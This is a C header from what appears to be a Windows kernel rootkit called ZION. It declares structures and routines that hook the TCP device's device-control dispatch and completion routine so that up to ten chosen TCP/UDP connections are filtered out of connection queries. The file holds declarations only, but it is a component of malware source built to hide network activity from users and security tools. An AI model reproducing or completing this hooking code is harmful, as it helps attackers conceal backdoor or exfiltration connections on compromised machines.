/*
 *      name: ZION system tdi hook kernel
 *      Org Author: Liang Chen
 *      Version : 0.2
 */
#pragma once

#include <ntddk.h>
#include "tdiinfo.h"
#include <windef.h>
#include <memory.h>
#include "zion/server/zion_common.h"
#include "zion/zion_cmd_packet.h"
#include "../include/zion/zion_tdi_connection_def.h" 
#include "zion_server_helper.h"
#define IOCTL_TCP_QUERY_INFORMATION_EX 0x00120003
#define TCP_CONNECTION_INFO_TYPE_101		0x101
#define TCP_CONNECTION_INFO_TYPE_102		0x102
#define TCP_CONNECTION_INFO_TYPE_110		0x110
#define UDP_CONNECTION_INFO_TYPE_102		0x102
#define MAX_HIDEN_CONNECTION 10
#pragma pack(1)
typedef struct _ZION_HIDE_CONNECTION_INFO
{
	DWORD Total;
	ZION_TDI_CONNECTION_CMD_DATA connection[MAX_HIDEN_CONNECTION];
}ZION_HIDE_CONNECTION_INFO, *PZION_HIDE_CONNECTION_INFO;
typedef struct _TCP_INFO_101 {
   unsigned long status; 
   unsigned long dwSrcAddr; 
   unsigned short dwSrcPort; 
   unsigned short unknown1; 
   unsigned long dwDstAddr; 
   unsigned short dwDstPort; 
   unsigned short unknown2; 
} TCP_INFO_101, *PTCP_INFO_101;

typedef struct _TCP_INFO_102 {
   unsigned long status; 
   unsigned long dwSrcAddr; 
   unsigned short dwSrcPort; 
   unsigned short unknown1; 
   unsigned long dwDstAddr; 
   unsigned short dwDstPort; 
   unsigned short unknown2; 
   unsigned long pid;
} TCP_INFO_102, *PTCP_INFO_102;

typedef struct _TCP_INFO_110 {
   unsigned long size;
   unsigned long status; 
   unsigned long dwSrcAddr; 
   unsigned short dwSrcPort; 
   unsigned short unknown1; 
   unsigned long dwDstAddr; 
   unsigned short dwDstPort; 
   unsigned short unknown2; 
   unsigned long pid;
   PVOID    unknown3[35];
} TCP_INFO_110, *PTCP_INFO_110;
typedef struct _UDP_INFO_102 {
   unsigned long dwSrcAddr; 
   unsigned short dwSrcPort;  
   unsigned short unknown; 
   unsigned long pid;
} UDP_INFO_102, *PUDP_INFO_102;
typedef struct _CONTEXT_INFO {
	PIO_COMPLETION_ROUTINE OldCompletion;
	unsigned long          ReqType;
	unsigned long			ProtocolType;
} CONTEXT_INFO, *PCONTEXT_INFO;
#pragma pack()
typedef NTSTATUS (*OLDIRPMJDEVICECONTROL)(IN PDEVICE_OBJECT, IN PIRP);
extern PFILE_OBJECT g_pFile_tcp;
extern PDEVICE_OBJECT g_pDev_tcp;


extern OLDIRPMJDEVICECONTROL g_OldIrpMjDeviceControl;



NTSTATUS Zion_DeviceControl(IN PDEVICE_OBJECT, IN PIRP);
BOOL AddNonRepeatedData(PZION_HIDE_CONNECTION_INFO Database,PZION_TDI_CONNECTION_CMD_DATA src);
BOOL IfMatchedWithDataBase(PVOID ptrInfo,PZION_HIDE_CONNECTION_INFO ptrDatabase,DWORD type,DWORD ProtocolType );
NTSTATUS Zion_CompletionRoutine(IN PDEVICE_OBJECT, IN PIRP, IN PVOID);